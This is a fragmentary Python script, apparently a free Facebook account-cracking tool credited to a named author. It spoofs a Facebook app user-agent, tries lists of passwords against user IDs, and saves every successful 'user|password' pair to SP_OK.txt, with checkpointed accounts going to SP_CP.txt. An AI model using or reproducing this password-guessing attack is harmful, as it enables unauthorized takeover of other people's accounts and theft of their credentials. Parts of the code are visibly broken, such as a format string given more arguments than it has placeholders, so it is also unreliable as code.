...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;92m Author \x1b[1;97m : \033[1;37m           Shahzad Panwar
\033[1;31m\033[1;29m Facebook\x1b[1;97m:  \033[1;37m           Shahzad Panwar
\033[1;31m\033[1;92m TooL\x1b[1;97m  : \033[1;37m                 FREE 
\033[1;31m\033[1;60m Version\x1b[1;97m : \033[1;37m             0.0.1
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSP_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSP_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back SP Menu ")
	    sarfraz()
...
def sarfraz():
    ...
    print(' [2] Create File [Working-Method]')
    print(' [E] exit ')
    print('')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[SP] {loop}|{len(self.id)} [ok][{len(ok)}] [cp[{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SP-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('SP_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [SP-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SP_CP.txt' , 'a').write('%s\n' % wrt)
                        break
